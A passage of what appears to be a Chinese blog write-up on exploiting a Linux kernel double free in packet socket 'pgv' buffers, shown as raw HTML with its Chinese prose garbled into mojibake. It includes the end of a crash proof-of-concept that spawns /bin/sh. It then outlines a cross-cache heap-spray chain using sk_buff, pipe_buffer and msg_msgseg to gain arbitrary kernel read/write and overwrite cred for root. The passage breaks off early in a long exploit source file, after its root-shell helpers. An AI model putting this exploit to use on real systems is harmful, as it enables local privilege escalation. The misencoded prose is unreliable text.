setsockopt&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[?] You are still alive!?&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    proof_of_concept();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ kfree çš„ double free æ£€æµ‹é€ æˆ kernel crashï¼š</p><p><img src="https://s2.loli.net/2025/05/03/MtsimKZRCqzwlbT.png"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02. æ¼æ´åˆ©ç”¨"></a>0x02. æ¼æ´åˆ©ç”¨</h1><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¾—ç›Šäº <code>pgv</code> ç»“æ„ä½“çš„å¤§å°æ˜¯å¯å˜ä¸”å¯æ§çš„ï¼Œä¸”åˆ†é…è‡ªé€šç”¨çš„ <code>GFP_KERNEL</code> ï¼Œå› æ­¤æˆ‘ä»¬æœ‰å¾ˆå¤šç§åˆ©ç”¨æ–¹å¼</p><h2 id="Exploitï¼šFrom-Cross-Cache-Double-Free-to-Arbitrary-Read-Write-Recommended"><a href="#Exploitï¼šFrom-Cross-Cache-Double-Free-to-Arbitrary-Read-Write-Recommended" class="headerlink" title="Exploitï¼šFrom Cross-Cache Double Free to Arbitrary Read&amp;Write (Recommended)"></a>Exploitï¼šFrom Cross-Cache Double Free to Arbitrary Read&amp;Write (Recommended)</h2><p>è™½ç„¶ç¬”è€…é€‰æ‹©çš„å†…æ ¸ç‰ˆæœ¬ <code>5.11.16</code> å®é™…ä¸Šä¸å­˜åœ¨ <code>GFP_KERNEL</code> ä¸  <code>GFP_KERNEL_ACCOUNT</code> ä¹‹é—´çš„éš”ç¦»ï¼Œåˆ©ç”¨èµ·æ¥å¾ˆèˆ’æœï¼Œä½†ç¬”è€…è¿˜æ˜¯å†³å®šå°è¯•ç¼–å†™ cross-cache UAF çš„æ”»å‡»æ–¹æ³•ï¼š</p><ul><li>é¦–å…ˆå †å–· <code>sk_buff</code> ï¼Œåˆ†é… <code>pgv</code> åé‡Šæ”¾ï¼Œå†å †å–· <code>sk_buff</code> å–å› <code>pgv</code></li><li>å°†è¿™äº› <code>sk_buff</code> å…¨éƒ¨é‡Šæ”¾ï¼Œä»è€Œå¡«æ»¡ partial listsï¼Œä½¿å¾— slub page é‡Šæ”¾å› buddy system</li><li>å †å–· <code>pipe_buffer</code> ä»¥å–å›è¿™äº›é¡µé¢</li><li>è§¦å‘æ¼æ´é‡Šæ”¾ <code>pgv</code> ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¼šæœ‰ä¸€ä¸ª <code>pipe_buffer</code> è¢«é‡Šæ”¾å› slub</li><li>ç»§ç»­å †å–· <code>pipe_buffer</code> ï¼Œæ¯å–·ä¸€ä¸ªå°±æ£€æµ‹æ˜¯å¦åˆ†é…åˆ°äº† victimï¼Œå½“åˆ†é…åˆ° victim æ—¶è·³å‡º</li><li>æ­¤æ—¶æˆ‘ä»¬ä¾¿æœ‰ç€å¯¹åŒä¸€å†…æ ¸å¯¹è±¡çš„ä¸¤ä¸ª <code>pipe_buffer</code> å¼•ç”¨ï¼Œ<strong>ä¸”ç”±äºæˆ‘ä»¬æ˜¯æ£€æµ‹åˆ° victim ä¾¿åœæ­¢ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¿è¯ victim object å¿…å®šåœ¨ cpu slab ä¸Šï¼Œä»è€Œé¿å…äº†åç»­çš„å †å–·è¿‡ç¨‹</strong></li><li>æœ€åå°±æ˜¯æƒ¯ä¾‹çš„ä½¿ç”¨å’Œ <code>pipe_buffer</code> ä¸€æ ·åˆ†é…è‡ª <code>GFP_KERNEL_ACCOUNT</code> çš„ <code>msg_msgseg</code> å»ä¸åœæ”¹å†™ <code>pipe_buffer</code> ä»¥å®Œæˆå¯¹å†…æ ¸ç©ºé—´çš„ä»»æ„åœ°å€è¯»å†™ï¼Œè¿™é‡Œæœ‰ä¸ªå°ç‚¹æ˜¯æˆ‘ä»¬çš„ pipe çš„ head ï¼ˆå†™èµ·å§‹ï¼‰ä¸ tail ï¼ˆè¯»èµ·å§‹ï¼‰éƒ½éœ€è¦ä» <code>pipe_buffer[0]</code> å¾€åè‡³å°‘ç§»åŠ¨ä¸€ä¸ªï¼Œå› ä¸º <code>pipe_buffer[0]::page</code> ä¸ <code>msg_msgseg::next</code> æ˜¯é‡å çš„ï¼Œä¼šé€ æˆå¹²æ‰°ï¼ˆ <del>ä¾ç¨€è®°å¾—ç¬”è€…æœ¬ç§‘é‚£ä¼šåœ¨åˆšå‘ç°è¿™ç§åˆ©ç”¨æ‰‹æ³•æ—¶è°ƒè¿™ç©æ„è°ƒäº†åŠå¤©</del> ï¼‰</li></ul><p>æœ‰äº†å†…æ ¸ç©ºé—´çš„ä»»æ„è¯»å†™æƒé™ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æƒ³åšä»€ä¹ˆåšä»€ä¹ˆäº†ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ‰¾åˆ°å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> å¹¶æ”¹å†™ <code>cred</code> çš„ uid ä¸º rootï¼Œè¿™æ˜¯ä¸€ç§ç»å…¸çš„ data-only çš„æ”»å‡»ï¼Œ <strong>ä¸ä¾èµ–äºç‰¹å®šç‰ˆæœ¬çš„å†…æ ¸é•œåƒï¼Œç†è®ºä¸Šåªè¦ä½ æœ‰è¿™ä¸ªæ´å°±èƒ½æˆåŠŸæ‰“</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IS_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PTR_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg) <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg) <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_MSG(msg) <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_error(msg)      puts(ERR_MSG(msg))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_GRANULARITY 0x10000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_MASK (~(KASLR_GRANULARITY - 1))</span><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error at: &quot;</span>) <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] Failed to get the root!&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    log_success(<span class="hljs-string">&quot;[+] Successful to get the root.&quot;</span>);<br>    log_info(<span class="hljs-string">&quot;[*] Execve root shell now...&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;su root -c sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of potential segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Process binded to core: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span 